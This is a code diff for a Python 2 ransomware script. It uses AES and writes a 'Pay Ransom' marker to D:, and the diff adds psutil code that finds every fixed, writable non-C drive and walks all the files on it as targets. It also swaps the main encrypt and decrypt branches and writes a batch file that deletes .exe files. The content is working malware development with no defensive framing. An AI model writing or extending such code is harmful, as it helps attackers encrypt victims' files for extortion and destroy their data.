@@ -1,4 +1,4 @@
-import os, random, getpass, shutil, string, urllib
+import os, random, getpass, shutil, string, urllib, psutil
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 
@@ -67,16 +67,28 @@ def start_encrypting():
   f=open("D:/check.bat","w")
   f.write("echo 'Pay Ransom'")
   f.close()
-  
+
+  drives=[]
+  all_drives=psutil.disk_partitions()
+  for drive in all_drives:
+    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
+      drives.append(list(drive)[1][0])
+  for drive in drives:
+    for subdir, dirs, files in os.walk(drive+":/"):
+        for file in files:
+            print os.path.join(subdir, file)
+
 
 
 
 if __name__ == '__main__':
   if os.path.isfile("D:/check.bat"):
-    start_encrypting()
-  else:
+    print "Decrypting"
     start_decrypting()
-
+  else:
+    start_encrypting()
+    print "Encrypting.."
+  s=raw_input()
   with open("del.bat", "w") as delfile:
     delfile.write("@echo off\n")
     delfile.write('del *.exe\n')
